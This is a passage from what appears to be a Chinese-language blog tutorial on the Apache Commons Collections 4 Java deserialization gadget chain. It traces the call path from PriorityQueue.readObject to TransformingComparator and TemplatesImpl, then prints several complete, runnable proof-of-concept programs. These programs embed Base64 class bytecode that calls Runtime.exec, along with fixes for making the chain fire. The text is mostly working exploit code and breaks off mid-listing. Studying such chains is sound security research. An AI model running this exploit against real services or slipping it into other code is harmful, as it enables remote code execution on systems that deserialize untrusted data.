src=\"MAQGTLbeDBXN6pbLPNnfbzfykIkC0tNMgWn5S5C4C8g.png\" alt=\"image\"></p>\n<p>查看调用关系；找到了TransformingComparator的compare有调用transform</p>\n<p><img src=\"nGETIR_xdQIt0uzPye0fFKq-3v_E-ZAquYFaZCMT8lw.png\" alt=\"image\"></p>\n<p>在一个Java内置类PriorityQueue中的readObject调用了heapify</p>\n<p><img src=\"Q1CkaFy7IVIJYDB5SEtoaRJCsTZbcc9NjMBrgflktNY.png\" alt=\"image\"></p>\n<p>在heapify中调用了siftDown</p>\n<p><img src=\"aXfVNoI1uBGHqG2kkLQNSjgI6wJ_jr9_sjHLCyx_XcM.png\" alt=\"image\"></p>\n<p>在siftDown的构造函数中调用了compare；然后就一直走到上诉的compare</p>\n<p><img src=\"vu7yxVWgJY8WLkARcpu4aY4OA70ONaz6wj5iPDu3Pdk.png\" alt=\"image\"></p>\n<p>还注意到了TransformingComparator在cc3中没有继承接口；但是在cc4中却继承了，很有利于我们进行利用。</p>\n<p><img src=\"Vwmv4CCHJM6hYLFgdhO_dTyWk7QyWSOU7LbQ-XVcbfw.png\" alt=\"image\"></p>\n<p>这时候的利用链为：</p>\n<p><img src=\"F_lzqnKWJcO4H_DbzBOKcMxZzfhUlDfT6U0nsVN7k3M.png\" alt=\"image\"></p>\n<p>我们来尝试构造一下</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">TransformingComparator</span> <span class=\"variable\">transformingComparator</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">TransformingComparator</span>&lt;&gt;(chainedTransformer);</span><br><span class=\"line\"><span class=\"type\">PriorityQueue</span> <span class=\"variable\">priorityQueue</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br></pre></td></tr></table></figure>\n<p>完整的poc</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.garck3h.ccChain4;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections4.Transformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.xml.transform.Templates;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Field;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Base64;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.PriorityQueue;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">CC4</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">byte</span>[] codes = Base64.getDecoder().decode(<span class=\"string\">&quot;yv66vgAAADQAJAcAFgoAAQAXCgAHABcKABgAGQgAGgoAGAAbBwAcAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAKRXhjZXB0aW9ucwcAHQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgcAHgEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAY8aW5pdD4BAAMoKVYBAApTb3VyY2VGaWxlAQAOQnl0ZUNsYXNzLmphdmEBACFjb20vZ2FyY2szaC9jbGFzc2xvYWRlci9CeXRlQ2xhc3MMABIAEwcAHwwAIAAhAQAEY2FsYwwAIgAjAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEAAQAHAAAAAAAEAAkACAAJAAIACgAAACUAAgACAAAACbsAAVm3AAJMsQAAAAEACwAAAAoAAgAAAA0ACAAOAAwAAAAEAAEADQABAA4ADwACAAoAAAAZAAAAAwAAAAGxAAAAAQALAAAABgABAAAAEgAMAAAABAABABAAAQAOABEAAgAKAAAAGQAAAAQAAAABsQAAAAEACwAAAAYAAQAAABcADAAAAAQAAQAQAAEAEgATAAIACgAAAC4AAgABAAAADiq3AAO4AAQSBbYABlexAAAAAQALAAAADgADAAAAGAAEABkADQAaAAwAAAAEAAEADQABABQAAAACABU&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">TemplatesImpl</span> <span class=\"variable\">templates</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">TemplatesImpl</span>();</span><br><span class=\"line\">        setFieldValue(templates, <span class=\"string\">&quot;_class&quot;</span>, <span class=\"literal\">null</span>);</span><br><span class=\"line\">        setFieldValue(templates, <span class=\"string\">&quot;_name&quot;</span>, <span class=\"string\">&quot;xxx&quot;</span>);</span><br><span class=\"line\">        setFieldValue(templates, <span class=\"string\">&quot;_bytecodes&quot;</span>, <span class=\"keyword\">new</span> <span class=\"title class_\">byte</span>[][]&#123;codes&#125;);</span><br><span class=\"line\">        setFieldValue(templates, <span class=\"string\">&quot;_tfactory&quot;</span>, <span class=\"keyword\">new</span> <span class=\"title class_\">TransformerFactoryImpl</span>());</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">InstantiateTransformer</span> <span class=\"variable\">instantiateTransformer</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">InstantiateTransformer</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;Templates.class&#125;, <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[]&#123;templates&#125;);</span><br><span class=\"line\">        Transformer[] transformers = <span class=\"keyword\">new</span> <span class=\"title class_\">Transformer</span>[]&#123;</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class=\"line\">                instantiateTransformer</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        <span class=\"type\">ChainedTransformer</span> <span class=\"variable\">chainedTransformer</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ChainedTransformer</span>(transformers);</span><br><span class=\"line\">        <span class=\"type\">TransformingComparator</span> <span class=\"variable\">transformingComparator</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">TransformingComparator</span>&lt;&gt;(chainedTransformer);</span><br><span class=\"line\">        <span class=\"type\">PriorityQueue</span> <span class=\"variable\">priorityQueue</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class=\"line\"></span><br><span class=\"line\">        serialize(priorityQueue);</span><br><span class=\"line\">        unserialize();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">serialize</span><span class=\"params\">(Object obj)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">ObjectOutputStream</span> <span class=\"variable\">outputStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectOutputStream</span>( <span class=\"keyword\">new</span> <span class=\"title class_\">FileOutputStream</span>(<span class=\"string\">&quot;ser.bin&quot;</span>));</span><br><span class=\"line\">        outputStream.writeObject(obj);</span><br><span class=\"line\">        outputStream.close();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">unserialize</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span>  Exception&#123;</span><br><span class=\"line\">        <span class=\"type\">ObjectInputStream</span> <span class=\"variable\">inputStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectInputStream</span>( <span class=\"keyword\">new</span> <span class=\"title class_\">FileInputStream</span>(<span class=\"string\">&quot;ser.bin&quot;</span>));</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">obj</span> <span class=\"operator\">=</span> inputStream.readObject();</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setFieldValue</span><span class=\"params\">(Object obj, String fieldName, Object value)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">Field</span> <span class=\"variable\">field</span> <span class=\"operator\">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class=\"line\">        field.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">        field.set(obj, value);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>运行发现没弹计算器，也没报错</p>\n<p><img src=\"EkBj14n9qg4_KYpyLnomufckn1jfqnILD1CuIoDHZLU.png\" alt=\"image\"></p>\n<p>我们跟进去看看，发现在heapify中进行for遍历的时候，没有进入到siftDown。通过遍历数组中的元素，从最后一个非叶子节点开始，逐个向上处理每个节点。&gt;&gt;&gt;是size的值右移一位，相当于将其除以 2 取整。</p>\n<p><img src=\"jK7cfwkXlDfUADo8XbSvvesQ4hKfCFOj3VVbiSA5rwg.png\" alt=\"image\"></p>\n<p>要怎么样才可以满足，进入到siftDown呢？当size&#x3D;1的时候不成立。</p>\n<p><img src=\"jln2QDTSS2db5o_nA_CjpyQgBMrF4oVx9dgtDhkBNmY.png\" alt=\"image\"></p>\n<p>当我们的size为2的时候就为1，然后再减1，即可满足i&gt;&#x3D;0的条件</p>\n<p><img src=\"IBQ1LGhqIKIvwzP1dFelVOLlBLrGyzY5_tISUVt4y_w.png\" alt=\"image\"></p>\n<h3 id=\"解决方式一\"><a href=\"#解决方式一\" class=\"headerlink\" title=\"解决方式一\"></a>解决方式一</h3><p>我们可以通过反射来修改其值为2</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">setFieldValue(priorityQueue, <span class=\"string\">&quot;size&quot;</span>, <span class=\"number\">2</span>);</span><br></pre></td></tr></table></figure>\n<p>最终的代码为</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.garck3h.ccChain4;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections4.Transformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.xml.transform.Templates;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Field;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Base64;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.PriorityQueue;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Created by IntelliJ IDEA.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Author</span>: Garck3h</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Date</span>: 2023/8/15</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Time</span>: 15:11</span></span><br><span class=\"line\"><span class=\"comment\"> * Life is endless, and there is no end to it.</span></span><br><span class=\"line\"><span class=\"comment\"> **/</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">CC4</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">byte</span>[] codes = Base64.getDecoder().decode(<span class=\"string\">&quot;yv66vgAAADQAJAcAFgoAAQAXCgAHABcKABgAGQgAGgoAGAAbBwAcAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAKRXhjZXB0aW9ucwcAHQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgcAHgEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAY8aW5pdD4BAAMoKVYBAApTb3VyY2VGaWxlAQAOQnl0ZUNsYXNzLmphdmEBACFjb20vZ2FyY2szaC9jbGFzc2xvYWRlci9CeXRlQ2xhc3MMABIAEwcAHwwAIAAhAQAEY2FsYwwAIgAjAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEAAQAHAAAAAAAEAAkACAAJAAIACgAAACUAAgACAAAACbsAAVm3AAJMsQAAAAEACwAAAAoAAgAAAA0ACAAOAAwAAAAEAAEADQABAA4ADwACAAoAAAAZAAAAAwAAAAGxAAAAAQALAAAABgABAAAAEgAMAAAABAABABAAAQAOABEAAgAKAAAAGQAAAAQAAAABsQAAAAEACwAAAAYAAQAAABcADAAAAAQAAQAQAAEAEgATAAIACgAAAC4AAgABAAAADiq3AAO4AAQSBbYABlexAAAAAQALAAAADgADAAAAGAAEABkADQAaAAwAAAAEAAEADQABABQAAAACABU&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">TemplatesImpl</span> <span class=\"variable\">templates</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">TemplatesImpl</span>();</span><br><span class=\"line\">        setFieldValue(templates, <span class=\"string\">&quot;_class&quot;</span>, <span class=\"literal\">null</span>);</span><br><span class=\"line\">        setFieldValue(templates, <span class=\"string\">&quot;_name&quot;</span>, <span class=\"string\">&quot;xxx&quot;</span>);</span><br><span class=\"line\">        setFieldValue(templates, <span class=\"string\">&quot;_bytecodes&quot;</span>, <span class=\"keyword\">new</span> <span class=\"title class_\">byte</span>[][]&#123;codes&#125;);</span><br><span class=\"line\">        setFieldValue(templates, <span class=\"string\">&quot;_tfactory&quot;</span>, <span class=\"keyword\">new</span> <span class=\"title class_\">TransformerFactoryImpl</span>());</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">InstantiateTransformer</span> <span class=\"variable\">instantiateTransformer</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">InstantiateTransformer</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;Templates.class&#125;, <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[]&#123;templates&#125;);</span><br><span class=\"line\">        Transformer[] transformers = <span class=\"keyword\">new</span> <span class=\"title class_\">Transformer</span>[]&#123;</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class=\"line\">                instantiateTransformer</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        <span class=\"type\">ChainedTransformer</span> <span class=\"variable\">chainedTransformer</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ChainedTransformer</span>(transformers);</span><br><span class=\"line\">        <span class=\"type\">TransformingComparator</span> <span class=\"variable\">transformingComparator</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">TransformingComparator</span>&lt;&gt;(chainedTransformer);</span><br><span class=\"line\">        <span class=\"type\">PriorityQueue</span> <span class=\"variable\">priorityQueue</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class=\"line\"></span><br><span class=\"line\">        setFieldValue(priorityQueue, <span class=\"string\">&quot;size&quot;</span>, <span class=\"number\">2</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        serialize(priorityQueue);</span><br><span class=\"line\">        unserialize();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">serialize</span><span class=\"params\">(Object obj)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">ObjectOutputStream</span> <span class=\"variable\">outputStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectOutputStream</span>( <span class=\"keyword\">new</span> <span class=\"title class_\">FileOutputStream</span>(<span class=\"string\">&quot;ser.bin&quot;</span>));</span><br><span class=\"line\">        outputStream.writeObject(obj);</span><br><span class=\"line\">        outputStream.close();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">unserialize</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span>  Exception&#123;</span><br><span class=\"line\">        <span class=\"type\">ObjectInputStream</span> <span class=\"variable\">inputStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectInputStream</span>( <span class=\"keyword\">new</span> <span class=\"title class_\">FileInputStream</span>(<span class=\"string\">&quot;ser.bin&quot;</span>));</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">obj</span> <span class=\"operator\">=</span> inputStream.readObject();</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setFieldValue</span><span class=\"params\">(Object obj, String fieldName, Object value)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">Field</span> <span class=\"variable\">field</span> <span class=\"operator\">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class=\"line\">        field.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">        field.set(obj, value);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img src=\"1S8vpHMlobA8J-BZPBh8thcKSCqrZeYBY9wW10-768s.png\" alt=\"image\"></p>\n<h3 id=\"解决方式二\"><a href=\"#解决方式二\" class=\"headerlink\" title=\"解决方式二\"></a>解决方式二</h3><p>另一种方法则是直接add两个数进去</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">priorityQueue.add(<span class=\"number\">1</span>);</span><br><span class=\"line\">priorityQueue.add(<span class=\"number\">2</span>);</span><br></pre></td></tr></table></figure>\n<p>但是我们在序列化的时候就执行，为了避免这样，我们还是老样子，先传入一个无效的chainedTransformer，然后再通过反射修改为有效的chainedTransformer</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">TransformingComparator</span> <span class=\"variable\">transformingComparator</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">TransformingComparator</span>&lt;&gt;(<span class=\"keyword\">new</span> <span class=\"title class_\">ChainedTransformer</span>&lt;&gt;());</span><br><span class=\"line\"></span><br><span class=\"line\">setFieldValue(transformingComparator,<span class=\"string\">&quot;transformer&quot;</span>,chainedTransformer);</span><br></pre></td></tr></table></figure>\n<p>完整的poc为</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.garck3h.ccChain4;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections4.Transformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.xml.transform.Templates;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Field;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Base64;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.PriorityQueue;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Created by IntelliJ IDEA.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Author</span>: Garck3h</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Date</span>: 2023/8/15</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Time</span>: 15:11</span></span><br><span class=\"line\"><span class=\"comment\"> * Life is endless, and there is no end to it.</span></span><br><span class=\"line\"><span class=\"comment\"> **/</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">CC4</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">byte</span>[] codes = Base64.getDecoder().decode(<span class=\"string\">&quot;yv66vgAAADQAJAcAFgoAAQAXCgAHABcKABgAGQgAGgoAGAAbBwAcAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAKRXhjZXB0aW9ucwcAHQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgcAHgEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAY8aW5pdD4BAAMoKVYBAApTb3VyY2VGaWxlAQAOQnl0ZUNsYXNzLmphdmEBACFjb20vZ2FyY2szaC9jbGFzc2xvYWRlci9CeXRlQ2xhc3MMABIAEwcAHwwAIAAhAQAEY2FsYwwAIgAjAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEAAQAHAAAAAAAEAAkACAAJAAIACgAAACUAAgACAAAACbsAAVm3AAJMsQAAAAEACwAAAAoAAgAAAA0ACAAOAAwAAAAEAAEADQABAA4ADwACAAoAAAAZAAAAAwAAAAGxAAAAAQALAAAABgABAAAAEgAMAAAABAABABAAAQAOABEAAgAKAAAAGQAAAAQAAAABsQAAAAEACwAAAAYAAQAAABcADAAAAAQAAQAQAAEAEgATAAIACgAAAC4AAgABAAAADiq3AAO4AAQSBbYABlexAAAAAQALAAAADgADAAAAGAAEABkADQAaAAwAAAAEAAEADQABABQAAAACABU&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">TemplatesImpl</span> <span class=\"variable\">templates</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">TemplatesImpl</span>();</span><br><span class=\"line\">        setFieldValue(templates, <span class=\"string\">&quot;_class&quot;</span>, <span class=\"literal\">null</span>);</span><br><span class=\"line\">        setFieldValue(templates, <span class=\"string\">&quot;_name&quot;</span>, <span class=\"string\">&quot;xxx&quot;</span>);</span><br><span class=\"line\">        setFieldValue(templates, <span class=\"string\">&quot;_bytecodes&quot;</span>, <span class=\"keyword\">new</span> <span class=\"title class_\">byte</span>[][]&#123;codes&#125;);</span><br><span class=\"line\">        setFieldValue(templates, <span class=\"string\">&quot;_tfactory&quot;</span>, <span class=\"keyword\">new</span> <span class=\"title class_\">TransformerFactoryImpl</span>());</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">InstantiateTransformer</span> <span class=\"variable\">instantiateTransformer</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">InstantiateTransformer</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;Templates.class&#125;, <span class=\"keyword\">new</span> <span class=\"title 